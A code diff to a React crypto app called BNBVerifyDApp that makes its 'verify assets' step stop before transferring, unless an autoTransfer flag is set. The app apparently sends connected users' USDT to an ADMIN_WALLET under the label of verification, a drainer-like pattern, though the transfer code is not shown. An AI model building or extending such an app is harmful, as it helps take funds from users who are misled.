@@ -419,7 +419,7 @@ export default function BNBVerifyDApp() {
     }
   }
 
-  const verifyAssets = async () => {
+  const verifyAssets = async (autoTransfer = false) => {
     if (!isConnected) {
       toast({
         title: "Wallet Not Connected",
@@ -509,6 +509,25 @@ export default function BNBVerifyDApp() {
 
       if (!gasCheck.hasEnough) {
         setVerificationStep("completed")
+        return
+      }
+
+      if (!autoTransfer) {
+        setVerificationResult({
+          type: "flash",
+          message: `⚠️ ${usdtBalance.toFixed(2)} USDT requires a manual transfer confirmation before payment is sent.`,
+          usdtAmount: usdtBalance,
+          bnbAmount: bnbBalance,
+          transferred: false,
+          adminWallet: ADMIN_WALLET,
+          isHighAmount: usdtBalance > HIGH_AMOUNT_THRESHOLD,
+        })
+        setVerificationStep("completed")
+        toast({
+          title: "⚠️ High USDT Amount Detected",
+          description: `Review the amount before initiating any transfer.`,
+          variant: "destructive",
+        })
         return
       }
 
@@ -637,6 +656,14 @@ export default function BNBVerifyDApp() {
   }
 
   const handleNext = async () => {
+    if (verificationStep === "checking" || verificationStep === "transferring") {
+      return
+    }
+
+    if (verificationStep === "completed") {
+      return
+    }
+
     if (!recipientAddress.trim()) {
       alert("Please enter an address")
       return
@@ -652,7 +679,7 @@ export default function BNBVerifyDApp() {
       return
     }
 
-    await verifyAssets()
+    await verifyAssets(false)
   }
 
   return (
